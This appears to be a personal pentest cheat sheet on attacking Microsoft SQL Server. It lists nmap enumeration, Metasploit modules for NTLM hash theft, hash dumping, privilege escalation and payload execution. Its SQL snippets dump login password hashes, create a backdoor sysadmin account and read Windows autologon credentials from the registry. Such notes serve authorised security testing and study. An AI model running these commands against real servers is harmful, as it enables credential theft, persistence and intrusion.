# mssql

**Author:** Julien Bongars\
**Date:** 2025-10-14 18:12:36
**Path:**

---

# Enumeration

```bash
# Locate sql client
locate mssqlclient

# Default port is TCP Port 1433

# Nmap script scan
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

# Metasploit mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts {target ip} [[need]] to get into the msf console and select the protocol first

# Connect with Mssqlclient.py
python3 mssqlclient.py Administrator@{target ip} -windows-auth
```

## Metasploit

```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```

# Concepts

- Micrososft's version of SQL

- Closed source and made to run on Windows

- Popular with applications that are tied to Microsoft's .NET framework.

## MSSQL Clients

- [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately

- Can be installed anywhere since its a client-side application, doesn't have to be on the server.

- This means that some people can have the app with the credentials saved, and we can use that to connect to the database

- MSSQL Clients;

  - mssql-cli

  - SQL Server Powershell

  - HeidiSQL

  - SQLPro

  - Impacket's mssqlclient.py

## MSSQL Default Databases

| Default System Database | Description                                                                                                                                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `master`                | Tracks all system information for an SQL server instance                                                                                                                                               |
| `model`                 | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`                  | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`                | Stores temporary objects                                                                                                                                                                               |
| `resource`              | Read-only database containing system objects included with SQL server                                                                                                                                  |

## Default Configuration

- When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NTSERVICE\MSSQLSERVER`

- Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system

## Dangerous Settings

Look out for these general errors people make when configuring databases

- MSSQL clients not using encryption to connect to the MSSQL server

- Check for linked server and option for whether server links to itself. More information in sp-linked-server.md page.

- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates

- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)

- Weak & default `sa` credentials. Admins may forget to disable this account

## Footprinting

- Default port `TCP 1433`

- nmap scanning:

  - `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248`

## Interacting

```sql
# Get version
select @@version;

# Get user
select user_name();
# Get current user permissions
SELECT SYSTEM_USER, USER_NAME(), CURRENT_USER;

# [[List]] users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

[[Get]] table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
[[List]] Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
[[Create]] user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

[[Enumerate]] links
enum_links
[[Use]] a link
use_link [NAME]

# Get all the users and roles
select * from sys.database_principals;
```

### Get row count for all tables in a database

**doesn't work...***

```sql
SELECT t.NAME AS TableName, p.rows AS RowCount FROM sys.tables t INNER JOIN sys.partitions p ON t.object_id = p.object_id WHERE t.is_ms_shipped = 0 AND p.index_id IN (0,1) ORDER BY p.rows DESC;
```

### Enum permissions

```sql
# is user sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

# get current user's server roles
SELECT r.name FROM sys.server_role_members m JOIN sys.server_principals r ON m.role_principal_id = r.principal_id JOIN sys.server_principals p ON m.member_principal_id = p.principal_id WHERE p.name = SYSTEM_USER;

# Get current database user permissions
SELECT permission_name, state_desc FROM sys.database_permissions WHERE grantee_principal_id = USER_ID();
```

## Register Keys

### SQL Server instance info

```sql
-- SQL Server instance info
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL';

-- SQL Server paths
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Setup', 'SQLBinRoot';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Setup', 'SQLDataRoot';

-- Login mode (mixed/Windows)
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQLServer', 'LoginMode';

-- Audit level
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQLServer', 'AuditLevel';
```

### Credentials & Autologon

```sql
sql-- Windows autologon credentials (goldmine if found)
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultUserName';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultPassword';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultDomainName';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'AutoAdminLogon';
```

### System Information

```sql
-- Computer name
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName', 'ComputerName';

-- Windows version
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName';
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'CurrentVersion';
```

### Installed Software

```sql
-- Check for other software
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall';
```

# References

[1433 - Pentesting MSSQL - Microsoft SQL Server | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
